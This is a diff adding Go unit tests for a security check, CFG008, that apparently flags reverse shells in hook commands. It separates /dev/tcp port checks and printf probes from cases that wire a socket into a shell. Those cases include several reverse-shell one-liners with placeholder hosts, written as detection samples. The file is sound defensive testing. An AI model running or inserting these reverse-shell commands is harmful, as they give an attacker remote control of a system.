@@ -143,3 +143,37 @@ func TestCFG008_AnchoredForms_Reported(t *testing.T) {
 		}
 	}
 }
+
+// Port checks open a TCP connection but never wire it to a shell's stdio,
+// so they must not be reported (#1677).
+func TestCFG008_DevTcpPortCheck_NoFinding(t *testing.T) {
+	for _, cmd := range []string{
+		`timeout 5 bash -c "exec 3<>/dev/tcp/$HOST/443" && echo up`,
+		`( exec 3<>"/dev/tcp/$host/$port" ) >/dev/null 2>&1 &`,
+	} {
+		if f := CFG008.Check(hookTarget(t, cmd)); len(f) != 0 {
+			t.Errorf("%s: expected no finding, got %v", cmd, f)
+		}
+	}
+}
+
+// Writing to the socket fd with printf is a probe, not a reverse shell.
+func TestCFG008_DevTcpPrintfFd_NoFinding(t *testing.T) {
+	cmd := `exec 3<>/dev/tcp/h/p; printf 'PING\r\n' >&3`
+	if f := CFG008.Check(hookTarget(t, cmd)); len(f) != 0 {
+		t.Errorf("expected no finding, got %v", f)
+	}
+}
+
+// A socket fd handed to a shell's stdin/stdout is a reverse shell.
+func TestCFG008_DevTcpFdShell_Reported(t *testing.T) {
+	for _, cmd := range []string{
+		`exec 3<>/dev/tcp/h/p; sh <&3 >&3`,
+		`exec 3<>/dev/tcp/h/p; bash 0<&3`,
+		`exec 3<>/dev/tcp/h/p; cat <&3 | sh`,
+	} {
+		if f := CFG008.Check(hookTarget(t, cmd)); len(f) == 0 {
+			t.Errorf("%s: expected a finding, got none", cmd)
+		}
+	}
+}
